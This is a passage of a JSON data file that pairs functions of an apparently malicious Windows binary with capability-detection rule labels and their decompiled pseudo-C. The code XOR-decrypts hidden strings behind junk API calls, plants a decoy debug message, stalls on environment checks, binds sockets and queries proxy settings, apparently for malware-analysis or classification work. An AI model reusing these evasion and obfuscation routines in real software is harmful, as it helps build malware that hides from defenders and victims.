iVar8;\n    uStack1372 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    puStack1376 = 0x40f222;\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    uStack1172 = 0x40;\n    puStack1376 = &stack0xfffffb6c;\n    puStack1380 = 0x40f23d;\n    (*_sym.imp.KERNEL32.dll_GlobalMemoryStatusEx)();\n    puStack1380 = &stack0xfffffbac;\n    if (pcVar5 == NULL) {\n        uStack1384 = 0x40f253;\n        (*_sym.imp.KERNEL32.dll_GetSystemInfo)();\n    }\n    else {\n        uStack1384 = 0x40f24b;\n        (*pcVar5)();\n    }\n    uStack1384 = 0xbd;\n    uStack1388 = 8;\n    uStack1292 = 0x32396f26;\n    uStack1288 = 0x580b6e21;\n    iStack1284 = 0x6f0f5345;\n    puStack1280 = 0x6e36322a;\n    iStack1276 = 0x53765833;\n    iStack1272 = 0x320b6f2b;\n    uStack1268 = 0x583d6e10;\n    uStack1264 = 0x6f3e537b;\n    uStack1260 = 0x6e1a320c;\n    uStack1256 = 0x537c5820;\n    uStack1252 = 0x320b6f32;\n    uStack1248 = 0x581c6e2a;\n    uStack1244 = 0x6f0b5346;\n    uStack1240 = 0x6e0f3235;\n    uStack1236 = 0x5357582c;\n    puStack1232 = 0x322c6f00;\n    uStack1228 = 0x580e6e21;\n    uStack1224 = 0x6f3e535e;\n    uStack1220 = 0x6e3c322a;\n    uStack1216 = 0x5357580c;\n    uStack1212 = 0x322b6f1d;\n    puStack1208 = 0x581d6e3c;\n    uStack1204 = 0x6f5e536e;\n    uStack1200 = 0x3258;\n    iStack1364 = 0x32586f6e;\n    uStack1360 = CONCAT31(uStack1360._1_3_, 0x53);\n    uStack1392 = 0x40f35e;\n    uStack1392 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    puStack1396 = 0x40f365;\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    iVar11 = 0;\n    iStack1312 = iVar8;\n    puStack1208 = &stack0xfffffae8 + -iVar8;\n    do {\n        puStack1396 = 0x40f384;\n        iVar4 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        if (iVar4 != 0xd4bc66) {\n            *(iVar11 + iVar8) = (&stack0xfffffaa0)[iVar11 % uStack1316] ^ (iVar11 + iVar8)[&stack0xfffffae8 + -iVar8];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x5e);\n    puStack1396 = &stack0xfffffb4c;\n    pcStack1404 = reloc.WS2_32.dll_bind;\n    uStack1408 = 0x40f3b8;\n    iStack1400 = iVar8;\n    iVar11 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyW)();\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar6 = uStack1320;\n    if (iVar11 == 0) {\n        uStack1408 = 0x51;\n        uStack1412 = 8;\n        puStack1380 = 0x4d3a4739;\n        puStack1376 = 0x48246902;\n        uStack1372 = 0x471a6d28;\n        uStack1368 = 0x69024d3b;\n        iStack1364 = 0x6d034835;\n        uStack1360 = 0x4d254708;\n        uStack1356 = 0x48146908;\n        uStack1352 = 0x471b6d39;\n        uStack1348 = 0x69034d21;\n        uStack1344 = 0x6d4d4820;\n        iStack1340 = 0x4d484769;\n        uStack1416 = 0x40f42d;\n        uStack1416 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        puStack1420 = 0x40f434;\n        iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n        iVar8 = 0;\n        iStack1400 = iVar11;\n        puStack1232 = &stack0xfffffa90 + -iVar11;\n        do {\n            puStack1420 = 0x40f453;\n            iVar4 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n            if (iVar4 != 0x9cfcf4) {\n                *(iVar8 + iVar11) =\n                     (&stack0xfffffab8)[iVar8 % iStack1340] ^ (iVar8 + iVar11)[&stack0xfffffa90 + -iVar11];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0x28);\n        puStack1420 = &stack0xfffffb3c;\n        puStack1424 = &stack0xfffffba8;\n        uStack1428 = 0;\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(uStack1228, iVar11, 0);\n        piVar9 = &stack0xfffffb90;\n        do {\n            iVar1 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar1 != uStack1368);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (piVar9 - &stack0xfffffb92 >> 1 != 0) {\n            iVar11 = 0x15;\n            uStack1416 = 0x4a105a17;\n            uStack1412 = 0x5a214239;\n            uStack1408 = CONCAT22(uStack1408._2_2_, 0x4a75);\n            puStack1376 = 0x4a755a4f;\n            uStack1372 = CONCAT22(uStack1372._2_2_, 0x4256);\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n            iVar4 = 0;\n            puStack1380 = &stack0xfffffa6c + -iVar8;\n            do {\n                iVar7 = (*_sym.imp.USER32.dll_CreateMenu)();\n                if (iVar7 != 0xd7dab0) {\n                    puStack1380 = 0x6;\n                    *(iVar4 + iVar8) = (&stack0xfffffa94)[iVar4 % 6] ^ (iVar4 + iVar8)[&stack0xfffffa6c + -iVar8];\n                }\n                pcVar2 = _sym.imp.SHLWAPI.dll_StrStrIW;\n                iVar4 = iVar4 + 1;\n            } while (iVar4 < 10);\n            iVar4 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(&stack0xfffffb84, iVar8);\n            while (pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap,  iVar4 != 0) {\n                (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n                iVar4 = (*pcVar2)(&stack0xfffffb78, iVar8);\n            }\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n        }\n        iVar8 = uStack1360;\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(uStack1252);\n        uVar6 = (*pcVar5)(0, iVar11);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n        uVar6 = uStack1320;\n    }\n    while ((uVar3 = uStack1320,  uStack1320 = uVar6,  iStack1192 == 0 && (uStack1196 < 2100000000))) {\n        uStack1408 = 10000;\n        uStack1412 = 0x40f5be;\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar6 = uStack1320;\n        uStack1320 = uVar3;\n    }\n    uStack1412 = 0;\n    uStack1416 = 0x40f5e0;\n    uStack1408 = iVar8;\n    uStack1416 = (*pcVar5)();\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    puStack1420 = 0x40f5e9;\n    (*_sym.imp.KERNEL32.dll_HeapFree)();\n    puStack1420 = uVar3;\n    puStack1424 = NULL;\n    uStack1428 = 0x40f5ef;\n    uStack1428 = (*pcVar5)();\n    (*pcVar2)();\n    uVar6 = (*pcVar5)(0, uStack1236);\n    (*pcVar2)(uVar6);\n    return;\n}\n",
        "token_count": 3705
    },
    "0040f62f": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint32_t fcn.0040f62f(void)\n\n{\n    ushort uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint uStack488;\n    uint uStack484;\n    uint uStack480;\n    uchar *puStack476;\n    uint32_t uVar8;\n    uchar auStack408 [404];\n    \n    puStack476 = &stack0xfffffe68;\n    uVar7 = 0;\n    uStack480 = 0x202;\n    uStack484 = 0x40f650;\n    (*_sym.imp.WS2_32.dll_WSAStartup)();\n    uStack484 = 0;\n    uStack488 = 1;\n    uVar2 = (*_sym.imp.WS2_32.dll_socket)(2);\n    if (uVar2 != 0xffffffff) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        uVar7 = iVar3 + 2000U & 0xffff;\n        uVar2 = 0;\n        if (uVar7 < 64000) {\n            uVar8 = 0x7e7c5d6a;\n            puStack476 = 0x6648504c;\n            do {\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                iVar6 = 0;\n                uVar7 = uVar8;\n                do {\n                    iVar5 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n                    if (iVar5 != 0x411781) {\n                        *(iVar6 + iVar3) = (&stack0xfffffe18)[iVar6 % 6] ^ (iVar6 + iVar3)[&stack0xfffffe20 + -iVar3];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 10);\n                (*_sym.imp.WS2_32.dll_inet_addr)(iVar3);\n                uVar1 = (*_sym.imp.WS2_32.dll_ntohs)(uVar7);\n                uVar8 = CONCAT22(uVar1, 2);\n                iVar6 = (*_sym.imp.WS2_32.dll_bind)(0x6679, &stack0xfffffe30, 0x10);\n                if (iVar6 == 0) {\n                    (*_sym.imp.WS2_32.dll_closesocket)(0x6679);\n                    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                    uVar2 = (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    break;\n                }\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                uVar7 = uVar7 + 1;\n                uVar2 = 0;\n            } while (uVar7 < 64000);\n        }\n    }\n    return uVar2 & 0xffff0000 | uVar7 & 0xffff;\n}\n",
        "token_count": 712
    },
    "0040f79b": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040f79b(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    code *pcVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint var_34ch;\n    uint var_144h;\n    uint var_104h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8bh;\n    uint var_87h;\n    uint var_83h;\n    uint var_7fh;\n    uint var_7bh;\n    uint var_77h;\n    uint var_73h;\n    ushort var_6fh;\n    int32_t var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    ushort var_48h;\n    uint var_46h;\n    ushort var_42h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uchar var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_c4h = 0x208;\n    (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(\"MP3 file corrupted\");\n    uVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, 0x40f780, 0, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar2);\n    iVar3 = fcn.0040ee89();\n    if (iVar3 == 0) {\n        fcn.0040f0c2();\n        fcn.004087dc();\n        while ((iVar3 = fcn.00409526(),  iVar3 != 0 || (iVar3 = fcn.00409590(),  iVar3 != 0))) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n        }\n    }\n    pcVar6 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    iVar3 = (*_sym.imp.KERNEL32.dll_VirtualProtect)(str.AJDJV__, 0x184, 0x40, &var_b4h);\n    if (iVar3 != 0) {\n        fcn.0040ce5d();\n        (*pcVar6)(str.AJDJV__, 0x184, var_b4h, &var_b4h);\n    }\n    puVar7 = 0x41dd90;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    fcn.004049b3();\n    puVar9 = &var_5ch;\n    for (iVar3 = 0x1c; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar9 = &var_c0h;\n    for (iVar3 = 0xc; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar7 = 0x41dd7c;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar9 = &var_34ch;\n    for (iVar3 = 0x208; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_GetUserNameW)(&var_34ch, &var_c4h);\n    var_3ch = 5;\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar3 != 0) {\n        var_24h = 0x42024b05;\n        var_20h = 0x5119501f;\n        var_1ch = 0x4b115a0c;\n        var_18h = 0x501f421c;\n        var_14h._0_1_ = 0x4b;\n        var_14h._1_1_ = 0x51;\n        var_8h = 0x42514b50;\n        var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x5a);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar8 = 0;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_DestroyCaret)();\n            if (iVar4 != 0xc1213a) {\n                *(iVar8 + iVar3) = *(&var_8h + iVar8 % var_3ch) ^ (iVar8 + iVar3)[&var_24h - iVar3];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0x12);\n        (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)(iVar3, &var_34ch);\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    iVar3 = fcn.0040dad9();\n    var_34h = 6;\n    if (iVar3 != 0) {\n        if (2 < var_5ch._1_1_) {\n            iVar3 = 0;\n            if (0 < var_5ch._1_1_ - 2) {\n                do {\n                    *0x41dd6c = *0x41dd6c + (&var_50h)[iVar3];\n                    iVar3 = iVar3 + 1;\n                } while (iVar3 < var_5ch._1_1_ - 2);\n            }\n        }\n        *0x41dd6c = *0x41dd6c ^ 0x43103655;\n        iVar3 = fcn.0040ef6d();\n        if (iVar3 != 0) {\n            if (*0x41daec < 6) {\n                var_b0h = 0x36635c29;\n                var_ach = 0x25247b61;\n                var_a8h = 0x751d4902;\n                var_a4h = 0x30705d56;\n                var_a0h = 0x22451d1d;\n                var_9ch = 0x77133d70;\n                var_98h = 0x330c5d24;\n                var_94h = 0x27560f61;\n                stack0xffffff6d = 0x5675725b;\n                var_8bh = 0x13310229;\n                var_87h = 0x70272a0f;\n                var_83h = 0x38756149;\n                var_7fh = 0x6133634f;\n                var_7bh = 0x225247b;\n                var_77h = 0x56751d49;\n                var_73h = 0x1b30705d;\n                var_6fh = 0x6d1d;\n                var_8h = 0x724b666d;\n                var_4h._0_2_ = 0x345a;\n                var_90h._0_1_ = 5;\n                uVar2 = (*pcVar6)(8, 0x44);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                iVar8 = 0;\n                var_40h = &var_b0h - iVar3;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n                    if (iVar4 != 0xbc1013) {\n                        *(iVar8 + iVar3) = *(&var_8h + iVar8 % var_34h) ^ (iVar8 + iVar3)[var_40h];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 0x43);\n            }\n            else {\n                var_24h = 0x1d1d5630;\n                var_20h = 0x22587d34;\n                var_1ch = 0x7d436b62;\n                var_18h = 0x501c3b2f;\n                var_8h = 0x50356c63;\n                var_4h._0_2_ = 0x4678;\n                uVar2 = (*pcVar6)(8, 0x11);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                iVar8 = 0;\n                var_40h = &var_24h - iVar3;\n                do {\n                    iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n                    if (iVar4 != 0x4cf6d9) {\n                        *(iVar8 + iVar3) = *(&var_8h + iVar8 % var_34h) ^ (iVar8 + iVar3)[var_40h];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 0x10);\n            }\n            var_c0h = 0xc;\n            var_b8h = 0;\n            var_bch = 0;\n            (*_sym.imp.ADVAPI32.dll_ConvertStringSecurityDescriptorToSecurityDescriptorA)(iVar3, 1, &var_bch, 0);\n            uVar2 = (*pcVar6)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n    }\n    *0x41dd88 = fcn.0040f62f();\n    *0x41dd88 = *0x41dd88 & 0xffff;\n    var_20h = 0x390b2235;\n    var_1ch = 0xb323312;\n    var_18h = 0x3f3c1402;\n    var_14h._0_1_ = 0x1c;\n    var_14h._1_1_ = 0x66;\n    var_8h = 0x666e5a50;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x61);\n    uVar2 = (*pcVar6)(8, 0xf);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_6ch = &var_20h - iVar3;\n    var_40h = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetInputState)();\n        if (iVar4 != 0x696dc2) {\n            *(iVar8 + iVar3) = *(&var_8h + iVar8 % var_3ch) ^ (iVar8 + iVar3)[var_6ch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xe);\n    var_20h = 0xf102603;\n    var_1ch = 0x1e3e112e;\n    var_18h = 0x261d2f0f;\n    var_14h._0_1_ = 0x1c;\n    var_14h._1_1_ = 0x61;\n    var_8h = 0x61715270;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x4a);\n    uVar2 = (*pcVar6)(8, 0xf);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_2ch = 0;\n    var_38h = &var_20h - iVar3;\n    var_6ch = iVar3;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar8 != 0xadff42) {\n            *(var_2ch + iVar3) = *(&var_8h + var_2ch % var_3ch) ^ (var_2ch + iVar3)[var_38h];\n        }\n        var_2ch = var_2ch + 1;\n    } while (var_2ch < 0xe);\n    var_64h = 0x5d253454;\n    var_60h._0_2_ = 0x6c0c;\n    var_10h = 0x787a4771;\n    var_ch._0_1_ = 0x68;\n    var_ch._1_1_ = 0x6c;\n    uVar2 = (*pcVar6)(8, 7);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_38h = &var_64h - iVar3;\n    var_8h = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n        if (iVar4 != 0xb24cb6) {\n            *(iVar8 + iVar3) = *(&var_10h + iVar8 % var_34h) ^ (iVar8 + iVar3)[var_38h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 6);\n    (*_sym.imp.USER32.dll_wsprintfA)(&var_104h, iVar3, var_40h, *0x41da40);\n    *0x41dad4 = fcn.0040cc05();\n    *0x41dd88 = 6000;\n    var_2ch = var_2ch & 0xff000000 | 0x332248;\n    var_10h = 0x7233466d;\n    var_ch._0_1_ = 0x7a;\n    var_ch._1_1_ = 0x32;\n    uVar2 = (*pcVar6)(8, 4);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_38h = &var_2ch - iVar3;\n    var_64h = iVar3;\n    do {\n        iVar4 = (*pcVar6)();\n        if (iVar4 != 0xcfbc0) {\n            *(iVar8 + iVar3) = *(&var_10h + iVar8 % var_34h) ^ (iVar8 + iVar3)[var_38h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 3);\n    (*_sym.imp.USER32.dll_wsprintfA)(&var_144h, iVar3, *0x41dd88);\n    var_ch._0_1_ = 0x77;\n    var_2ch = 0x64716f71;\n    var_28h = 0x77;\n    var_10h = 0x1041d05;\n    uVar2 = (*pcVar6)(8, 6);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_68h = &var_10h - iVar3;\n    var_38h = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar4 != 0xa58c7d) {\n            *(iVar8 + iVar3) = *(&var_2ch + iVar8 % var_3ch) ^ (iVar8 + iVar3)[var_68h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 5);\n    var_1ch = 0x375f0b1f;\n    var_18h = 0x58311b20;\n    var_14h._0_1_ = 0x37;\n    var_14h._1_1_ = 0x4f;\n    var_10h = 0x53316e69;\n    var_ch._0_1_ = 0x4f;\n    uVar2 = (*pcVar6)(8, 0xb);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_2ch = &var_1ch - iVar3;\n    var_68h = iVar3;\n    do {\n        iVar4 = (*pcVar6)();\n        if (iVar4 != 0xa7139c) {\n            *(iVar8 + iVar3) = *(&var_10h + iVar8 % var_3ch) ^ (iVar8 + iVar3)[var_2ch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_54h = 0x18131439;\n    var_50h = 0x163b0a36;\n    var_4ch._0_1_ = 0x1f;\n    var_4ch._1_1_ = 5;\n    var_4ch._2_2_ = 0x1735;\n    var_48h = 0x1022;\n    var_46h._0_2_ = 0x408;\n    var_46h._2_1_ = 0x2f;\n    var_46h._3_1_ = 0x1c;\n    var_42h = 0x7531;\n    var_18h = 0x767a7554;\n    var_14h._0_1_ = 0x46;\n    var_14h._1_1_ = 0x78;\n    uVar2 = (*pcVar6)(8, 0x15);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_10h = &var_54h - iVar3;\n    var_2ch = iVar3;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar4 != 0xcb629f) {\n            *(iVar8 + iVar3) = *(&var_18h + iVar8 % var_34h) ^ (iVar8 + iVar3)[var_10h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x14);\n    var_58h = 0x13222302;\n    var_54h = 0x250e3d04;\n    var_50h = 0x2c351f04;\n    var_4ch._0_1_ = 0x1c;\n    var_4ch._1_1_ = 0x18;\n    var_4ch._2_2_ = 0x2419;\n    var_48h = 0x2d00;\n    var_46h._0_2_ = 0xe04;\n    var_46h._2_1_ = 0x50;\n    var_34h = 0x774c4250;\n    var_30h._0_1_ = 0x6b;\n    uVar2 = (*pcVar6)(8, 0x16);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_10h = &var_58h - iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar4 != 0x1f5ec6) {\n            *(iVar8 + iVar3) = *(&var_34h + iVar8 % var_3ch) ^ (iVar8 + iVar3)[&var_58h - iVar3];\n        }\n        pcVar6 = _sym.imp.KERNEL32.dll_SetEnvironmentVariableA;\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x15);\n    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(var_6ch, var_38h);\n    (*pcVar6)(var_68h, &var_104h);\n    (*pcVar6)(var_2ch, 0x41da44);\n    (*pcVar6)(iVar3, &var_144h);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n    puVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    puVar9 = puVar5;\n    for (iVar8 = 0xc; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar5 = 0x20;\n    *0x41dae0 = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 0, 0, 0);\n    pcVar6 = _sym.imp.KERNEL32.dll_CreateThread;\n    *0x41dd90 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040d97b, puVar5, 0, 0);\n    *0x41dd94 = (*pcVar6)(0, 0, fcn.004043f1, *0x41dacc, 0, 0);\n    *0x41dd98 = (*pcVar6)(0, 0, fcn.004084a4, puVar5, 0, 0);\n    *0x41dd9c = (*pcVar6)(0, 0, 0x401686, puVar5, 0, 0);\n    uVar2 = (*pcVar6)(0, 0, fcn.0040e9af, arg_8h, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar2);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, var_2ch);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_68h);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_38h);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_64h);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_8h);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_6ch);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_40h);\n    (*pcVar6)(uVar2);\n    return 0;\n}\n",
        "token_count": 5504
    },
    "00401f2c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00401f2c(uint param_1, uchar *param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint uVar8;\n    uint *puVar9;\n    uint pszFile;\n    uint32_t pAutoProxyOptions;\n    uint32_t var_54h;\n    int32_t var_50h;\n    uint var_44h;\n    int32_t var_40h;\n    int32_t pProxyConfig;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint32_t pszSrch;\n    int32_t var_28h;\n    uchar *psz1;\n    int32_t lpcwszUrl;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint pProxyInfo;\n    int32_t psz2;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_14h = 0;\n    puVar9 = &pProxyConfig;\n    psz1 = param_2;\n    for (iVar7 = 4; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar9 = &pszFile;\n    for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *param_2 = 0;\n        param_2 = param_2 + 1;\n    }\n    iVar7 = (*_sym.imp.WINHTTP.dll_WinHttpGetIEProxyConfigForCurrentUser)(&pProxyConfig);\n    if ((iVar7 != 0) && (iVar7 = fcn.00401ed5(),  iVar7 != 0)) {\n        iVar7 = 6;\n        uVar8 = 1;\n        var_40h = 6;\n        if (((pProxyConfig != 0) || (var_38h != 0)) &&\n           (iVar4 = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(0, 1, 0, 0, 0),  iVar4 != 0)) {\n            puVar9 = &pAutoProxyOptions;\n            for (; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            if (pProxyConfig != 0) {\n                pAutoProxyOptions = pAutoProxyOptions | 1;\n                var_54h = var_54h | 1;\n            }\n            if (var_38h != 0) {\n                pAutoProxyOptions = pAutoProxyOptions | 2;\n                var_50h = var_38h;\n            }\n            var_44h = 1;\n            puVar9 = &pProxyInfo;\n            for (iVar7 = 4; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            iVar7 = (*_sym.imp.WINHTTP.dll_WinHttpGetProxyForUrl)(iVar4, lpcwszUrl, &pAutoProxyOptions, &pProxyInfo);\n            if ((iVar7 != 0) && (psz2 != 0)) {\n                (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, psz2);\n                (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar4);\n                